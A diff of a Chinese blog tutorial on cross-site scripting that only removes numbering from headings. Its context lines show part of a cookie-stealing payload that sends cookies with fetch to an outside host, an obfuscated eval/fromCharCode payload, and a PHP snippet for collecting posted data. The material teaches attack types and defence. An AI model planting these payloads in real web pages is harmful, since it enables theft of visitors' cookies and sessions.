@@ -6,13 +6,13 @@ tags:
 - XSS
 ---
 
-### 1. XSS 简介
+### XSS 简介
 
 xss 全称(Cross Site Scripting)跨站脚本攻击，为了不和层叠样式表(Cascading Style Sheet, CSS) 缩写混淆，因此写作 XSS。属于一种脚本注入攻击，也就是攻击者把恶意脚本、html注入网站，当前其他用户访问的时候，这些恶意脚本、html 就在注入的网站的上下文中运行，从而对访问者造成攻击。
 
 <!-- more -->
 
-### 2. XSS 攻击危害
+### XSS 攻击危害
 
 * 盗取用户 Cookie：有一天你发现仅剩 4 块钱（一个桶面）余额的银行卡，被转走了3.5 块到一位陌生用户，痛哭流涕的想着自己的晚餐（桶面）的情况下拨通了客服电话，接电话的还是个男的，顿时火冒三丈：谁转走了我的桶面，哦不，3.5 块? 客服查了下转账记录说：先生，您于某时某分某地登录银行网站转了 3.5 块给某某。此处省略1000字…….，很可能就是 Cookie 被盗走了，利用你在网站的权限把钱转走，还有 5 毛买个糖瓜吧。
 * 导航到恶意网站：点击某个连接，进去的却是另外一个恶俗网站。
@@ -20,13 +20,13 @@ xss 全称(Cross Site Scripting)跨站脚本攻击，为了不和层叠样式表
 * 插入广告：是否有过这样的经历，当你通过某个连接进入某个网站的时候发现一顿不堪入目的广告（前提的是你没开广告拦截器）
 * 钓鱼网站：这个词是否经常在某某新闻 APP 上看到？攻击者修改 DOM 插入假的登录框，活着把表单的action 属性指向他自己的服务器，然后欺骗用户提交用户的铭感信息。
 
-### 3.XSS 攻击方式
+### XSS 攻击方式
 
 既然 XSS 可以造成这么大危害，当然应该建立一些防范措施。但是，不急，在聊防范方式之前，我们先来分析 XSS 是怎么实现上述攻击的？有哪些攻击方式？如何联合其他攻击方式一起使用？
 
 XSS 共分为三种攻击方式，从易用上，存储型 XSS > DOM 型 XSS > 反射型 XSS。
 
-###### 3.1 存储型 XSS
+#### 存储型 XSS
 
 我们从简单的开始，存储型 XSS 就是存入了数据库，在取出来，导致 XSS。比较典型的地方是：消息论坛，评论区，留言板 XSS。攻击者构造好攻击代码，提交到评论区，当其他用户进入这个页面的时候，浏览器从服务器拉取数据，并做正常的 html 和 js 解析执行，进而触发 XSS 攻击。
 
@@ -54,7 +54,7 @@ hi, 你的 cookie 要被盗了哟<img src=1 onerror="fetch(`http://www.xsshack.c
 
 ![图片](https://ws1.sinaimg.cn/large/006tKfTcgy1fnqtz8y3yrj317c0zck0k.jpg)
 
-###### 3.2 DOM 型 XSS
+#### DOM 型 XSS
 
 简单理解就是它的输出点在 DOM，和后端完全没有关系，攻击者只要诱导别人去点击有 XSS 代码的 URL 就能实现攻击。看下面的 demo：
 
@@ -66,7 +66,7 @@ hi, 你的 cookie 要被盗了哟<img src=1 onerror="fetch(`http://www.xsshack.c
 
 ![图片](https://ws1.sinaimg.cn/large/006tKfTcgy1fnqwao6jdwj31g40s6ai9.jpg)
 
-###### 3.3 反射型 XSS
+#### 反射型 XSS
 
 反射型 XSS，也是通过给别人发送带有 XSS 代码的链接，诱导其他人点击进而造成攻击。与 DOM 型 XSS 不同的是，这类型攻击一般出现在搜索页面，需要将注入代码从目标服务器通过错误信息、搜索结果等方式“反射”回来，在受害者浏览器上执行，而 DOM 型 XSS 是不需要经过目标服务器的，明白这点就很容易区分 反射性 XSS 和 DOM 型 XSS 了。
 
@@ -86,7 +86,7 @@ hi, 你的 cookie 要被盗了哟<img src=1 onerror="fetch(`http://www.xsshack.c
 5. 用户输入一些有用的信息；
 6. 在不知不觉之间，用户泄漏了自己的信息。
 
-### 4. XSS payload
+### XSS payload
 
 上面有谈到窃取 cookie 的 demo 中谈到了 XSS payload, XSS payload 是什么？
 
@@ -114,7 +114,7 @@ Javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))
 
 
 
-### 5. 入侵方法（摘自[XSS的利用方式----(朽木原创)](http://nvhack.com/forum.php?mod=viewthread&tid=162&extra=page%3D1)
+### 入侵方法（摘自[XSS的利用方式----(朽木原创)](http://nvhack.com/forum.php?mod=viewthread&tid=162&extra=page%3D1)
 
 攻击者发现xss漏洞->构造代码->发送给受害人->受害人打开->窃取受害人ccookie->完成攻击.
 
@@ -190,11 +190,11 @@ Xiumu.php代码:<?php echo $_POST[‘a’]?><?php echo $_POST[‘b’]?>
 
 （4）xss.tv 是个好网站
 
-### 6. 常用编码
+### 常用编码
 
 刘志龙大神分析的很好，这里就不再赘述，[刘志龙-从零开始学web安全（3）](http://nvhack.com/forum.php?mod=viewthread&tid=162&extra=page%3D1)
 
-### 7.XSS 防御
+### XSS 防御
 
 XSS防御基本上遵循七条原则:
 
